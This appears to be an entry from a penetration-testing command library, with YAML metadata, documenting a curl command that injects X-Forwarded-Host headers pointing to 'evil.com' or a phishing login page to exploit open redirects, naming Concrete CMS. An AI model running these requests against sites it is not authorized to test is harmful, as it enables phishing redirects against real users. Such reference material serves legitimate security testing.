---
data: >-
  curl -H "Host: target.com" -H "X-Forwarded-Host: http://evil.com" -H
  "X-Forwarded-Proto: http" http://target.com/redirect-endpoint -v -L
tags:
  - web
  - redirect
  - injection
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:26.124Z'
id: d02dba06-2739-47a0-bb3b-048e7587cbfc
verified: false
validated: true
submitted: true
---
# curl-header-injection-redirect

## Command

```bash
curl -H "Host: target.com" -H "X-Forwarded-Host: http://evil.com" -H "X-Forwarded-Proto: http" http://target.com/redirect-endpoint -v -L
```

## Description

This curl command tests for open redirect vulnerabilities by injecting custom HTTP headers to manipulate the redirect destination in web applications like Concrete CMS. It simulates a forwarded request from a malicious host, useful for exploiting header-based redirect flaws.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-H "Host: target.com"` | Sets the Host header to the legitimate target domain | Yes |
| `-H "X-Forwarded-Host: http://evil.com"` | Injects a forwarded host pointing to the malicious redirect URL | Yes |
| `-H "X-Forwarded-Proto: http"` | Specifies the protocol for the forwarded request | Yes |
| `http://target.com/redirect-endpoint` | The vulnerable endpoint URL | Yes |
| `-v` | Verbose mode to display request/response headers | No |
| `-L` | Follows redirects automatically | No |

## Examples

### Basic Usage

```bash
curl -H "X-Forwarded-Host: http://evil.com" http://target.com/redirect -v
```

### Advanced Usage

```bash
curl -H "Host: target.com" -H "X-Forwarded-Host: https://phish-site.com/login" -H "X-Forwarded-Proto: https" -H "X-Original-URL: /fake" http://target.com/app/redirect -v -L -o /dev/null
```

## Expected Output

Verbose output showing the request headers sent, followed by a 3xx response with a Location header like "Location: http://evil.com/". If -L is used, it will follow to the final page, indicating successful exploitation.

## Related

- [[Related Procedure: Exploit Open Redirect via Header Injection in Concrete CMS]]
